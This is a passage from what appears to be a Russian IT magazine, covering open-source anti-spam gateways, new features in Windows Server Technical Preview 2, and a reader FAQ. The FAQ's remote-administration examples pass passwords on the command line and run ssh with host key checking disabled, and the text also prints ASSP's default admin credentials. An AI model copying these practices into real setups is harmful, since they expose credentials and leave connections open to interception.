ние спама и не требующая большого количества вычислительных мощностей.
Чтобы систему нельзя было запутать незначительными изменениями исход-
ного спам-сообщения, используются алгоритмы получения нечетких сигнатур.
Полученный хеш сравнивается с данными в централизованной базе: в случае
обнаружения совпадения такое сообщение помечается как спам и может быть
отброшено на раннем этапе. В результате такая антиспам-система работает
быстро, практически не дает ошибок и незаметна для пользователей. Практика
показывает, что такой простой метод даже в самых сложных случаях позволяет
легко отсеять более 80% спам-писем.
  По такому принципу работает Razor, написанный на Perl. Он используется
как самостоятельно, так и в качестве аддона к SpamAssassin. В последнем слу-
чае он дает возможность начать отсев спама с ходу без предварительного обу-
чения байесовского анализатора. Единственный минус — проект не развивал-
ся с 2007 года.
   Pyzor представляет собой версию Razor, написанную на Python. Кроме кода
клиента, предлагается и серверная часть, позволяющая развернуть свою базу.
Пакет есть в репозиториях дистрибутивов. Рекомендуемый разработчиками
способ установки Pyzor — через PIP. Для хранения информации может исполь-
зоваться GDBM (для небольших нагрузок), MySQL или Redis. Все настройки
производятся в нескольких файлах каталога ~/.pyzor. В файле config, в servers
прописываются серверы, с которыми работает клиент. По умолчанию публич-
ный сервер проекта — public.pyzor.org:24441. Файл config при установке
из пакетов не создается, но на сайте есть хороший пример.
   Для ручной проверки сообщений, получения информации, статистики,
управления локальным белым списком используется консольная утилита pyzor.
При первом подключении к серверу будет сгенерирован дайджест:

$ pyzor check < message.eml

Входной файл может быть в трех форматах: сообщение по RFC5321, mbox
и дайджест Pyzor. Есть коммерческая версия Razor, предлагаемая компанией
Cloudmark. По аналогичной технологии — проверка контрольных сумм и сверка
с базой — работает и Distributed Checksum Clearinghouse.

ASSP
Спам нужно останавливать до SMTP-сервера, у которого и так большая нагруз-
ка, кроме того, спам-фильтры в этом случае настраивает админ, а не пользо-
ватели, которые чаще запутывают ситуацию, чем помогают. Поэтому ASSP, или
Anti-Spam SMTP Proxy, — один из самых популярных и любимых проектов сре-
ди сисадминов. Он представляет собой платформонезависимый SMTP-прок-
си-сервер, принимающий сообщения до MTA и анализирующий его на спам.
После анализа нормальное сообщение переправляется дальше на SMTP-сер-
вер и попадает в трафик нормальной почты. Иначе письмо блокируется, от-
правителю посылается сообщение об ошибке, а письмо ложится в коллекцию
спама. Есть режим Test Mode, когда сообщение не блокируется, а помечается
тегом и доставляется получателю.
   Поддерживаются все популярные технологии: белые и серые списки, бай-
есовский фильтр, DNSBL, DNSWL, URIBL, SPF, DKIM, SRS, проверка на вирусы
(с ClamAV), блокировка или замена вложений и многое другое. Обнаруживается
кодированный MIME-спам и картинки (при помощи Tesseract). Поддерживаются
SSL/TLS-соединения, имеется клиент для проверки валидности сертификатов.
Ведется автоматический белый список клиентов, список необрабатываемых
адресов и доменов, защита от пересылки почты третьими лицами. Для провер-
ки спама может подключаться в качестве модулей Razor и DCC. Возможности
расширяются при помощи модулей, все они доступны на сайте проекта. Есть
функция архивирования спам-писем на POP3-сервере. Генерируется стати-
стика в SVG-файл.
   Практически все настройки производятся через веб-интерфейс, по умолча-
нию используется http://127.0.0.1:55555/, данные для входа — root/
nospam4me. Но готовься: параметров там очень много, и придется потратить
время, чтобы все обойти. Для хранения данных по умолчанию используется
BerkeleyDB, можно подключить MySQL, DB2, PgSQL, Firebird. Возможна син-
хронизация настроек между двумя серверами ASSP и автоматическое обнов-
ление движка и модулей через PPM или CPAN.





ASSP настраивается при помощи веб-интерфейса

  В настоящее время актуальна вторая вер-
сия ASSP, поддерживающая множество но-
вых функций, включая IPv6 и Multithreading,
поэтому рекомендуется использовать  ее.
Разработка V1 прекращена в конце 2014
года, и со временем прекратится выпуск ба-
гфиксов, хотя нужно признать, что она не-
сколько «легче» V2.
  ASSP можно устанавливать отдельно или
на том же сервере, что и SMTP. При разверты-  Подпись к видео
вании ASSP занимает 25‑й порт (опциональ-
но 465‑й и 587-й), поэтому, если SMTP-сервер расположен на той же машине,
рабочий порт необходимо будет перенастроить. Версия 2 может работать в ре-
жиме прозрачного прокси.
   Документация проекта не всегда внятная, а инструкции в Сети нередко уже
устаревшие, но при наличии некоторого опыта разобраться можно. Тем бо-
лее что после установки все работает из коробки, а дальше помогает веб-ин-
терфейс. Правда, некоторые параметры не представлены в веб-интерфейсе,
поэтому для более тонкой подстройки следует заглянуть в конфигурационный
файл. В основных репозиториях дистрибутивов пакета ASSP нет. Для установ-
ки в *nix и Win проект предлагает архив, все зависимости при этом необхо-
димо установить вручную. По умолчанию настроен Test Mode, после обучения
на примерно тысяче писем можно включать режим блокировки.

MAILSCANNER
MailScanner представляет собой all-in-one решение для проверки почты на на-
личие вирусов и спама, борьбы с фишинговыми письмами. Он анализирует
содержание письма, блокируя некоторые атаки, направленные на email-кли-
ентов и HTML-теги, проверяет вложения (запрещенные расширения, двойные
расширения, зашифрованные архивы и прочее), контролирует подмену адреса
в письме и многое другое. Есть возможность создания белого списка, архиви-
рования почты определенной группы пользователей.
   Реализованы и собственные правила, позволяющие администратору управ-
лять почтой по любому критерию, в том числе и реализуя нечто вроде DLP. При
помощи правил можно легко конвертировать HTML в некоторых сообщениях
в текст. Есть еще одна технология, позволяющая предотвратить утечку инфор-
мации, — MCP (Message Content Protection), в этом случае производится за-
пуск дополнительной копии SpamAssassin, но без активации антиспам-прове-
рок. Администратор указывает в файле ключевые слова и действия, которые
должны произойти при их появлении.
   MailScanner легко интегрируется с любым МТА, в поставке есть готовые кон-
фигурационные файлы. Помимо собственных наработок, он может использо-
вать сторонние решения. Например, проверка на вирусы может производиться
одним из более чем двадцати движков. Конечно, разработчики рекомендуют
ClamAV, но в списке практически все популярные, в том числе и коммерческие
решения. Для проверки на спам может использоваться SpamAssassin.
   MailScanner написан на Perl (около 50 тысяч строк) и распространяется под
лицензией GNU GPL. Разработки стартовали в 2001 году, с тех пор его загру-
зили более миллиона раз, и он используется для защиты от вирусов и спама
в тысячах организаций по всему миру. MailScanner служит основой некоторых
систем борьбы со спамом промышленного уровня (например, Mailborder) или
Baruwa. Весь процесс полностью контролировался одним человеком — Джу-
лианом Филдом (Julian Field), остальные разработчики не имели доступа к вет-
ке Git. С 2014 года его заменил Джерри Бентон (Jerry Benton) .
  Официально поддерживаются Red Hat / CentOS, Debian, Ubuntu LTS, SuSE
и FreeBSD, хотя будет работать и на любом другом *nix. Установку и конфигури-
рование сложными назвать нельзя. Все параметры прописываются в MailScanner.
conf и хорошо комментированы: в большинстве случаев достаточно указать ан-
тивирус и антиспам-программу. Кроме  этого, сегодня доступны модуль
к Webmin и веб-интерфейс MailWatch, делающие установку более наглядными.





К MailScanner доступно несколько интерфейсов

SCROLLOUT

Свободные решения традиционно считаются более сложными в настройке
и требуют некоторого опыта, но это легко решаемо. Scrollout F1 представля-
ет собой преднастроенный и автоматически конфигурируемый почтовый шлюз
с защитой от вирусов и спама, распространяемый по лицензии GNU GPL v2.
Предлагается веб-интерфейс, написанный на PHP, и скрипты оболочки с пред-
настройками ко множеству открытых продуктов — Postfix, getmail4, Razor,
SpamAssassin, Pyzor, FuzzyOCR, СlamAV, OpenSSL, Mailgraph и другим. Обе-
спечивается антивирусная и антиспам-проверка, геофильтрация по несколь-
ким параметрам, проверка при помощи DKIM, простое создание адресов-ло-
вушек, резервное копирование почты на специальный адрес и многое другое.
Основой всего является Linux (официально поддерживается Debian и Ubuntu) .
   Установка Scrollout F1 возможна двумя способами: на чистое «железо» при
помощи подготовленного ISO или на «чистый» Debian/Ubuntu. Также предлага-
ется в виде сервиса.
   Как альтернативу можно рассматривать MailCleaner, который распростра-
няется в виде ISO и требует установки на чистый компьютер, или E.F.A. Project,
представленный в виде образа для VMware или Hyper-V.





Настройка уровня «агрессивности» компонентов системы в Scrollout



СПАМ В КАРТИНКАХ
В 2006 году алгоритмы борьбы со спамом уже практически полностью блоки-
ровали его распространение, но спамеры придумали новый способ — картин-
ки, эффективно преодолевающие все фильтры, поскольку те были рассчитаны
лишь на работу с текстом. Пик спама такого рода пришелся на 2007 год, за-
тем было несколько вспышек. Как ответ на угрозу стартовало несколько open
source проектов, задача которых — определение спама в рисунках; все они
ориентированы в основном на использование в качестве модуля SpamAssassin:
FuzzyOcrPlugin, Image Cerberus, BayesOCR, OcrPlugin и Tesseract-OCR.
   Принцип работы прост: файл обычно преобразуется в PNM, затем переда-
ется в gocr, который возвращает текст. Все это требует некоторых ресурсов.
Разработки нацелены на англоязычное население, качество распознавания
оставляет желать лучшего, поэтому, как правило, требуется дополнительная
обработка; но большая часть спама отсеивается при помощи ставших уже
стандартными методов, и сегодня применение специальных решений нужно
не всегда.
SYN/ACK



 ПУТЬ ВПЕРЕД
  ЗНАКОМИМСЯ С WINDOWS SERVER
        TECHNICAL PREVIEW 2





В октябре прошлого года была представ-
лена новая версия Windows Server. На се-
годня мы уже имеем Technical Preview 2.
Как и следовало ожидать, нововведения
касаются виртуализации, подсистемы
хранения, сети и возможностей управле-       Мартин «urban.
                                                                                            prankster» Пранкевич
                                                                                                      martin@synack.ruния. Изменений много, некоторые неоче-
видны и скрыты в недрах API, часть еще
не работают и слабо документированы —
но уже можно делать некоторые выводы.

О РЕЛИЗЕ
Все последние релизы, следуя концепции «Better together», MS всегда представ-
ляла в тандеме: вместе с клиентской ОС сразу выходила и серверная. И сами
ОС появлялись традиционно в октябре-ноябре. В случае с Win 10 корпорация
решила отойти от этой установившейся практики: если финальная версия Win
10 будет доступна в виде бесплатного обновления для устройств на Win 7 и Win
8.1 уже 29 июля 2015 года, то серверная часть выйдет «где-то в 2016 году». При
этом следующая версия System Center Configuration Manager будет представ-
лена уже осенью этого года.
   Почему так? Предположения выдвигаются разные. Одни считают, что про-
граммисты MS наделали столько ошибок, что исправить их в срок невозможно,
поэтому и Previews чуть запаздывали. Более правдоподобной выглядит версия,
что корпорации нужно время, чтобы убедить пользователей переходить сра-
зу в облако, где новые возможности будут представлены раньше. Хотя, с дру-
гой стороны, некоторые из заявленных инструментов и функций на момент TP2
просто не работали — может, действительно не успевают?
  Но есть еще один момент: поддержка Win2k3 официально заканчивается
14 июля 2015 года, и единственная доступная серверная версия для мигра-
ции — это Win2k12R2, которая как бы скоро станет уже не новой.
  В общем, вопросов по релизу много.
   Называют в документации новую серверную ОС по-разному. Чаще просто
Windows Server Technical Preview, но в майских постах на blogs.technet.com она
проскакивает уже как Windows Server 2016 Technical Preview. Конечно, это все
может поменяться, так что дальше в тексте мы будем использовать просто аб-
бревиатуру TP2.
   Скачать тестовую версию TP2 можно по этому адресу. Минимальные си-
стемные требования по сравнению с предыдущим релизом не изменились: 1,4
Гц x64, 512 Мбайт RAM и 32 Гбайт HDD. Для загрузки предлагается образ ISO
или VHD, также можно попробовать новую ОС в Azure.

ПОЛЬЗОВАТЕЛЬСКИЙ ИНТЕРФЕЙС
Процесс установки не изменился. А вот названия при выборе типа установки пу-
тают. Теперь версия с GUI как таковая не существует. Очевидно, что система ори-
ентируется на облако, а управлять ей будем удаленно. Рекомендуемый режим
(предлагается по умолчанию) соответствует Core Server, после входа получим
консоль и можем вызвать менеджер задач по <Ctrl + Alt + Del>. Другой вариант
подписан как with local admin tools, здесь в дополнение получим Server Manager.
При необходимости, как и раньше, можно добавить GUI, установив компонент
Desktop Experience, но обратно его убрать невозможно (по крайней мере в TP2).

                                                  В интерфейсе
                                                          Windows Server TP2
                                                              убрано все лишнее





  В Windows 8 у пользователей много нареканий вызывало новое меню «Пуск»,
которое больше подходило для планшета, чем для рабочей станции. Сервер-
ную Windows 2012 эта участь также не миновала, и вместо классического меню
«Пуск» мы получили начальный экран в стиле Metro. В Win 10 представлен новый
вариант, в котором совмещены идеи старого меню и «живых плиток» из Win 8.
  Но в серверную ОС многие новые фишки из десктопа не дошли — точ-
нее, они были в ранних билдах, а затем начали пропадать. В Server TP2 пли-
ток по умолчанию нет, имеем привычное меню, но при желании в настройках
можно вернуть экран Metro. Появилась поддержка виртуальных рабочих столов
Task View, знакомых пользователям Linux и Mac. Теперь организовать работу
с несколькими открытыми приложениями стало проще. Быстро выбрать нуж-
ный помогают эскизы. Приложения можно перемещать между рабочими стола-
ми, при закрытии виртуального рабочего стола все открытые в нем приложения
перемещаются на соседний.
  Из  других  особенностей  хочется  отметить  наличие  Windows  Server
Antimalware, защищающего сервер от вредоносного ПО «из коробки», то есть
теперь не требуется покупать и ставить дополнительное ПО. Управлять на-
стройками можно при помощи WMI, PowerShell (командлеты *-MpPreference)
или групповой политики, обновления производятся через Windows Update. При
необходимости можно установить и GUI.

PS> Install-WindowsFeature Windows-Server-Antimalware-GUI





В состав серверной версии входит антивирус Windows Server Antimalware

POWERSHELL V5
ОС включают в себя PowerShell 5 (WMF 5.0), предлагающий новые возможности
и усовершенствование старых функций. Так, стало удобнее работать с консо-
лью: ее «раскрасили», и теперь команды, параметры и значения показываются
разным цветом, проще ориентироваться в большом выводе. Раньше история
команд сохранялась в текущей сессии, после закрытия консоли или выключе-
ния компьютера приходилось вспоминать сложный запрос, введенный еще
вчера, — теперь же оболочка помнит 4096 последних команд, которые сохра-
няются в%userprofile%\AppData\Roaming\PSReadline. Изменять настройки
консоли можно при помощи командлетов Get|Set-PSReadlineOption.
   Также ранее консоль PowerShell не любила специальных символов (всяче-
ских «не таких» кавычек), и при попытке выполнить скопированную из браузера
команду мы нередко получали ошибку. Теперь несовместимые специальные
символы автоматически очищаются и преобразуются в безопасный эквивалент.
   Новая фишка PowerShell JEA (Just Enough Admin) позволяет предоставлять
пользователям доступ только к конкретным функциям, ограничивая возмож-
ность pass the hash атак. В настоящий момент не входит в комплект. Чтобы ее
использовать, необходимо установить модуль xJEA. И главное — в PowerShell
v5 стали доступны классы, появились директивы Class, Enum и другие.
  Вывод Get-Command  |  measure сразу после установки системы показы-
вает 1504 командлета (в PS4 1301), и это только в базовом наборе. Новинок
много. Например, новый командлет New-TemporaryFile позволяет создавать
временные файлы одной командой, набор командлетов Get/Set-Clipboard
позволяет организовать обмен информацией с буфером обмена сессии PS
(поддерживаются картинки, текст и прочее), командлеты модуля Microsoft.
PowerShell.Archive — работать с архивами, Clear-RecycleBin — очищает
корзину на указанном диске.
   Некоторые командлеты получили новые возможности: так, теперь редакти-
ровать и копировать файлы из удаленной системы и на нее при помощи New-
PSSession проще простого:

PS> $session = New-PSSession -ComputerName computer_name
PS> Copy-Item -ToSession $session -Path C:\file.ps1 -Destination С:\

Возможна удаленная отладка скриптов и детальная трассировка в журнал Event
Tracing for Windows. Отладку упрощают ряд командлетов Runspace  (входят
в Microsoft.PowerShell.Utility). Новый модуль SoftwareInventoryLogging,
содержащий одиннадцать командлетов, дает возможность производить ин-
вентаризацию софта:

PS> Get-Command -Module SoftwareInventoryLogging | select Name

Но самым интересным  стало появление модулей  установки программ
PackageManagement (ранее OneGet), модулей PowerShellGet и управления се-
тевыми коммутаторами NetworkSwitchManager. Собственно, они были частич-
но анонсированы еще в PS4, когда появился репозиторий ПО Chocolatey и воз-
можность установки из него программ и модулей. Чтобы поставить Chrome,
не нужно лезть на сайт Google — достаточно просто ввести команду в консоли:

C:\> choco install googlechrome

Теперь  все  это  официально  входит  в  комплект  и  используется  PS.
PackageManagement фактически еще одна фишка из мира *nix, позволяющая
ставить программы из централизованного репозитория одной командой. Это
упрощает поиск ПО, его обновление и безопасность системы. Можно работать
с несколькими репозиториями и создавать свои. Набор командлетов получаем
командой

PS> Get-Command -Module PackageManagement
PS> Get-Command -Module PowerShellGet

Назначение их понятно: получение источников ПО (Get-PackageSource), поиск
пакета (Find-Package), получение пакета без установки (Get-Package), уста-
новка (Install-Package) и так далее:

PS> Install-Package googlechrome

Кстати, в Get-Command появился новый параметр -ShowCommandInfo, который
форматирует вывод PSObjects.
  В Chocolatey на сегодня насчитывается 2820 приложений. Единственный
минус — система поиска приложений несовершенна, желательно знать назва-
ние более точно. Если ввести

PS> Find-Package Chrome

то будет найден xChrome. А так — все работает.
   Функция Desired State Configuration (служба настройки требуемого состоя-
ния) дополнена новыми возможностями. И что совсем интересно — появилась
реализация PowerShell DSC for Linux. То есть теперь при помощи DSC можно
без проблем управлять конфигурацией разнородных сред. Добавим сюда еще
анонс о возможности работы в Win с OpenSSH. Кстати, cmd.exe никуда не дел-
ся, как и все привычные консольные команды: ipconfig, netstat, route и другие.





Теперь приложения можно ставить «как в Linux»

HYPER-V И STORAGE SERVICES
Функции этих двух ролей очень тесно связаны между собой, поэтому не бу-
дем их разделять. Для включения Hyper-V теперь необходимо, чтобы процес-
сор поддерживал технологию SLAT, — раньше это требование касалось толь-
ко клиентских Win 8/8.1, теперь и серверной ОС. Все современные чипы уже
поддерживают эту технологию (в Intel — EPT, в AMD — NPT), поэтому проблем
здесь никаких.
   Виртуальные машины получили новый формат с более высокой степенью
защиты от сбоев на уровне хранилища: VMCX используется для хранения дан-
ных конфигурации VM, а VMRS для runtime-данных. Формат бинарный, а не XML,
редактировать его вручную не получится. Обновления интеграционных компо-
нентов для гостевых ОС распространяются через Windows Update. Это очень
хорошо: теперь процессом могут управлять сами пользователи и не придется,
как раньше, возиться с vmguest.iso. Возможно горячее добавление виртуаль-
ных сетевых адаптеров и памяти для гостевых Win и Linux. Для Linux поддержи-
вается безопасная загрузка (secure boot) .
   Реализовано так называемое прозрачное обновление кластера  (Cluster
Operating System Rolling Upgrade), то есть узел Hyper-V с новой ОС будет ра-
ботать в одном кластере с Win 2012R2. При этом виртуальные ОС можно сво-
бодно перемещать и импортировать между ними в любую сторону (в Win 2012
и Win 2012R2 можно было только на вторую ОС). Для управления смешанным
кластером следует использовать обновленный диспетчер Hyper-V, входящий
в состав TP2. Вообще, диспетчер Hyper-V из состава TP2 обеспечивает управ-
ление хостами всех старых ОС за исключением Win2k8R2. Но все VM в сме-
шанном кластере будут создаваться и работать на уровне Win 2012R2 (версия
5); то есть их уровень при перемещении не меняется и новые функции действо-
вать не будут.
   Текущую версию проверить просто:

PS> Get-VM * | Format-Table Name, Version

После того как ОС на всех узлах кластера будут обновлены до TP2, следу-
ет вручную обновить версию конфигурации узлов кластера при помощи ко-
мандлета Update-ClusterFunctionalLevel. После  этого  будет  доступ-
на возможность обновления версии отдельных VM до 6‑й  (с изменением
формата файлов). Для этого следует остановить VM и выполнить на хосте
Update-VmConfigurationVersion  имя_VM. Но теперь добавить новый узел
с Win 2012R2 в кластер и перемещать на такую систему VM v6 невозможно, так
как не предусмотрен обратный откат с v6 на v5.
  В Win 2012R2 появилась возможность задавать пороги IOPS для конкретно-
го виртуального жесткого диска VM: теперь добавились политики Storage QoS,
позволяющие управлять минимальным и максимальным порогом для виртуаль-
ного HDD отдельной VM или группы VM, обеспечивая нужный SLA, мониторинг
и статус.
  Снапшоты в VM — это уже стандартная функция. В новой ОС появились так
называемые Production Checkpoints, позволяющие создавать снимок внутри
гостевой VM Win (для Linux с некоторыми оговорками) при помощи службы
VSS и быстро откатываться до нужной версии, когда необходимо. При жела-
нии можно, конечно, использовать стандартное сохранение состояния через
Saved State.
   Анонсирована новая функция Storage Replica, обеспечивающая блочную
синхронную репликацию между серверами по протоколу SMB3, зеркалируя
данные между серверами. Это позволяет реализовать разные сценарии отка-
зоустойчивости без потерь данных на уровне файловой системы. И главное:
теперь для организации отказоустойчивых кластеров достаточно софта от MS,
нет необходимости закупать оборудование сторонних производителей, подой-
дет обычный сервер с «кучей дисков». Асинхронная репликация никуда не де-
лась, но не обеспечивает стопроцентного сохранения информации и применя-
ется при размещении узлов кластера в удаленных сайтах.
  Упрощено использование нескольких (альтернативных) учетных данных для
входа на разные хосты в диспетчере Hyper-V. Обновленный протокол для связи
с удаленными хостами Hyper-V (WS-MAN + CredSSP, Kerberos или NTLM) по-
зволяет выполнять живую миграцию без предварительного включения ограни-
ченного делегирования в Active Directory. Использование стандартного откры-
того по умолчанию 80-го порта упрощает конфигурацию.

СЕТЬ
Новинки в сетевых функциях также тесно связаны с виртуализацией — в частно-
сти, с возможностью создания и управления большим количеством IP и подсе-
тей. Виртуальная инфраструктура требует возможности настройки сети на уров-
не L2. Модуль NetworkSwitchManager содержит девятнадцать командлетов
и позволяет просматривать настройки сетевых коммутаторов и управлять ими:

PS> Get-Command *-NetworkSwitch*





Командлеты модуля NetworkSwitchManager

  В Win 2012 появились функции, позволяющие строить поверх физической
сети виртуальные сети, к которым могли подключаться клиенты при помощи
мультитенантного VPN. Это дает достаточную гибкость при использовании тех-
нологий виртуализации. Только инструменты управления были несовершенны.
Но в TP2 появилась новая роль Network Controller, предоставляющая возмож-
ность автоматизировать настройки физических и виртуальных сетей, а также
управлять ими в дата-центре при помощи SCCM2012, SCVMM или SCOM. Под-
держиваются VM и виртуальные коммутаторы Hyper-V, физические маршрути-
заторы, брандмауэр и VPN-шлюзы. Функция балансировки нагрузки позволяет
использовать несколько серверов, обеспечивая высокую доступность и мас-
штабируемость.
  Cервер DHCP больше не поддерживает Network Access Protection (NAP).
Защита доступа к сети для DHCP-зон появилась в Win2k8, в Win 2012R2 ее объ-
явили как deprecated, и теперь она удалена. Убраны и все связанные полити-
ки: сервер теперь будет игнорировать запросы о соответствии требованиям
(statement of health) от клиентов DHCP, поддерживающих NAP, а сами клиенты
будут помечаться как несовместимые.
   Для DNS-сервера появилась возможность записи событий аудита и анали-
тики в журнал событий. По умолчанию она отключена, но активировать ее мож-
но в Event Viewer: в разделе Application and Services Logs находим DNS-Server
и в контекстном меню View отмечаем Show Analytic and Debug Logs. Журналы
DNS совместимы с клиентскими Event Tracing for Windows (ETW) приложения-
ми вроде LogMan, Tracelog, EtwDataViewer.





Включение записи аудита в DNS Server

   Второе большое нововведение в DNS-сервере — появление политик DNS
(DNS Policies). Теперь DNS-серверу можно указать, как реагировать на запрос
в зависимости от IP-клиента, подсети, протокола, домена, типа запроса и вре-
мени суток. Таким образом можно легко организовать балансировку нагрузки
или перенаправлять трафик на нужный ресурс. Например, если компания име-
ет региональный сайт, то локальный клиент будет направлен именно на него,
остальные получат IP общего сайта. В интерфейсе DNS Manager никаких на-
строек, связанных с DNS Policies, нет — для создания политик и управления
ими следует использовать командлеты *-DnsServerQueryResolutionPolicy.
  В новой версии Remote Desktop Services оптимизирован RemoteFX: в частно-
сти, поддерживается OpenGL 4.4 и OpenCL 1.1 API, можно выделять большее ко-
личество видеопамяти. В состав сервера входит роль MultiPoint Services, позво-
ляющая совместно работать на одном компьютере нескольким пользователям.
  В предыдущих версиях при создании безопасного site-to-site (S2S) соедине-
ния приходилось немного повозиться. Теперь для Windows Server Gateway мож-
но использовать более простой протокол GRE (Generic Routing Encapsulation).
Он поддерживается большинством маршрутизаторов, обеспечивает высокую
скорость подключения, позволяет маршрутизировать несколько виртуальных
и физических сетей, не создавая дополнительные туннели. Управление произ-
водится при помощи специальных командлетов *-VpnS2SInterface.
   Объявлены новые возможности в IPAM (некоторые пока не реализованы):
визуализация всех записей DNS-ресурсов, относящихся к IP-адресу, автома-
тизированная инвентаризация IP-адресов на основе этих записей, управление
жизненным циклом IP-адресов для DNS и DHCP.

ДРУГИЕ ПРОДУКТЫ
Обновлен Microsoft Identity Manager 2015  (MIM), в котором появилось еще
несколько функций. Так, в AD добавлена возможность  Privileged Access
Management (PAM), представляющая собой особый лес, который находится
в доверии к существующему и обеспечивает изоляцию для выполнения задач
с правами администратора пользователям специальной shadow group. Основ-
ная фишка таких групп в том, что туда участники добавляются на четко установ-
ленное время, необходимое для выполнения задачи. Срок членства заложен
в тикет Kerberos. Соответственно, обновлены средства мониторинга, позволя-
ющие определить, кто запросил доступ и кому он предоставлен, и отслеживать
деятельность пользователя.
   Комплект Windows ADK пополнен новым инструментом Windows Imaging and
Configuration Designer  (Windows ICD), предназначенным для интеграторов
и OEM-поставщиков. При помощи простого мастера можно создать новый
установочный образ Win или установочный пакет без знания ключей DISM и ко-
мандлетов PowerShell. Также отпала необходимость в сторонних инструментах
вроде DISM GUI.


                                                          Windows ICD
                                                               позволяет просто
                                                               настроить
                                                              загрузочный
                                                               образ





ВЫВОД
Это далеко не все изменения. Новая ОС активно развивается, корпорация вза-
имодействует с сообществом, и постоянно мелькает информация о функциях,
которые появятся в будущем. Ждем релиза.
                                         Алексей Zemond
                                            Панкратов
                                            3em0nd@gmail.com

FAQ
ЕСТЬ ВОПРОСЫ — ПРИСЫЛАЙ

                    НА FAQ@REAL.XAKEP.RU





    Какой плагин можешь посоветовать для плавного скроллинга стра-
Q ницы? Речь идет об анимации, которая проигрывается по мере
прокрутки страницы.
    Попробуй для своих проектов ScrollMagic. В качестве движка анимации
A  выбран GreenSock — это прекрасная библиотека для скриптовой анима-
ции на Flash, которая поддерживает и JavaScript. По ссылке есть все необходи-
мые инструкции для того, чтобы скачать и начать использовать данный инстру-
мент, успехов.

Q Подскажи какие-нибудь инструменты для тестирования юзабилити.
     Инструментов довольно много, у каждого свои плюсы и минусы. Практи-
A  чески все инструменты платные, но у многих есть триальный период, за ко-
торый можно определиться, стоит ли программа своих денег или нет. Начну
с Ovo Logger от Ovo Studios. Создан в основном для студий тестирования юза-
билити, в которых распределенные команды исследователей работают с боль-
шими объемами. Инструмент рассчитан в основном на них, поскольку им нужно
надежное средство для захвата, редактирования и обмена результатами. От-
сюда, как ты сам понимаешь, довольно высокая цена — аж от 3к долларов.
У этого же производителя есть Ovo Solo, его можно назвать лайт-версией Ovo
Logger, которая позволяет захватывать видео взаимодействия с экраном од-
новременно с лицами и голосами участников исследования. Простое управле-
ние ведения журнала позволяет анализировать получившиеся видео. Однако
инструмент поддерживает только Windows, поддержка iOS не предусмотрена.
Следующим могу предложить Morae от Techsmith — первый инструмент, специ-
ально созданный для юзабилити-тестирования, и, несмотря на возраст, до сих
пор один из лучших вариантов. Позволяет записывать, анализировать, редак-
тировать и делиться сессиями.
   Morae устанавливается на компьютер как приложение и через веб-камеру
записывает все взаимодействия с экраном, в том числе голос и лицо исследо-
вателя. В комплекте — вся документация, инструменты редактирования и рас-
пространения. Впечатляющие инструменты захвата и редактирования, подхо-
дит для больших проектов. Но Маки снова пролетают. Продолжать можно еще
и еще, софта очень много: тот же UsabilityTools, который содержит набор объ-
единенных в один интерфейс инструментов для юзабилити, фидбэка и отсле-
живания нажатий, или TryMyUI, что представляет собой дистанционный немо-
дерируемый инструмент на основе SaaS. У тестеров есть возможность самим
создавать задания. Предоставляются видео, включая захват экрана и голоса
тестеров.

Q Можно ли как-то рулить Windows-машинами из консоли Linux?
     Да, можно! Я вижу два наиболее интересных варианта: первый — это че-
A  рез winexe, второй — через freeSSHd. И тот и другой вариант рабочие
и довольно неплохие, давай разберем оба. Начнем с первого:

wget http://www.openvas.org/download/wmi/wmi-1.3.14.tar.bz2
tar -xvf wmi-1.3.14.tar.bz2
cd wmi-1.3.14\Samba\source\wineexe\

Далее либо вручную, либо с помощью patch -p0 -i patchfile применяем измене-
ния из https://goo.gl/ke0IjG:

sudo make

После чего можно уже делать

winexe -U domain/user%password //server 'dsquery group -name
"Группа"| dsget group -members | dsget user'

или

wmic -U domain/user%password //server 'select *
from Win32_ComputerSystem'

Первая команда winexe позволяет запускать любые консольные команды через
RPC на Windows-машине, вторая — делать WMI-запросы, что, в общем-то, дает
еще больше возможностей. Однако есть проблема с выводом консоли winexe
от удаленной машины, поскольку Microsoft любит и UTF-16, и CP1251, и CP866
разом. А местами и вовсе UCS-2. Проблема решается очень просто:

luit -encoding cp866 winexe -U domain/user%password //server 'cmd'

И второй вариант. Тут все совсем просто: ставим freeSSHd, настраиваем пу-
бличные ключи доступа, все аналогично обычному SSH, и пробуем подключить-
ся, выполнив команду листинга директорий:

ssh —2q -i <my_key_files_path>/id_dsa -ladmin -oStrictHostKeyChecking=
no -oUserKnownHostsFile=/dev/null <Win_Host_IP> "cmd /c dir c:\\"

    Как проще всего поиграться с разными светодиодами и кнопками,
Q  желательно без пайки?
     Если хочется попробовать вживую, потрогать руками, то стоит посмотреть
A  в сторону бредбоарда или так называемой беспаечной макетной платы.
Они бывают разных типов и размеров, но по сути похожи друг на друга. Внутри
у них разводка в виде металлических пластин, которые можно соединять между
собой проводками или скобами. Все это можно купить в том же deal extreme или
практически в любом магазине элек-
троники. Подобные платы позволяют,
как конструктор, собирать различные
схемы, пробовать компоненты между
собой перед тем, как их спаивать в уже
готовые устройства. Также можно по-
экспериментировать с компонентами
виртуально, для этого будет достаточ-
но скачать программу-симулятор типа
Proteus, где уже есть куча различных
компонентов, включая микроконтрол-
леры, из которых можно собрать прак-
тически что угодно.                     Бредбоард с компонентами


                                                Полезный хинтАУДИТ В WINDOWS
Q  Как работает аудит в Windows?
    Подсистема аудита в Windows работает в связке со службой журнала реги-
A  страции событий, генерируя заслуживающие доверия события безопас-
ности, и с компонентами, принимающими решения, связанные с безопасно-
стью.  Эти  компоненты  (часто  их  называют  мониторами  безопасности)
сформированы таким образом, что при принятии решения по безопасности или
выполнении какого-либо действия, относящегося к сфере безопасности, опо-
вещают подсистему аудита и передают ей данные об этих действиях. Система
аудита форматирует записи о событиях, представляя данные в целостном виде,
и отбрасывает те из сгенерированных событий, которые не соответствуют по-
литике аудита. Остальные события отправляются службе журнала регистрации
событий для регистрации в журнале. Подсистема аудита Windows реализована
в процессе распорядителя локальной безопасности, который в списке процес-
сов Windows фигурирует как lsass.exe, а также в ядре Windows. В LSA содержат-
ся компоненты пользовательского режима Windows, обеспечивающие принуди-
тельное выполнение политики безопасности и исполнение других функций без-
опасности, таких как аутентификация. Компоненты пакетов аутентификации хра-
нятся в LSA и направляют события напрямую в подсистему аудита. Компоненты же,
работающие в пользовательском режиме за пределами LSA, такие как домен-
ные службы AD и приложения, использующие программные интерфейсы аудита
Windows, направляют события в LSA через протокол удаленного вызова проце-
дур RPC. Ядро включает в себя многофункциональный интерфейс аудита для
использования компонентами ядра, такими как драйверы, а также диспетчер
объектов, отвечающий за генерирова-
ние  большинства событий  доступа
к объекту. События поступают в служ-
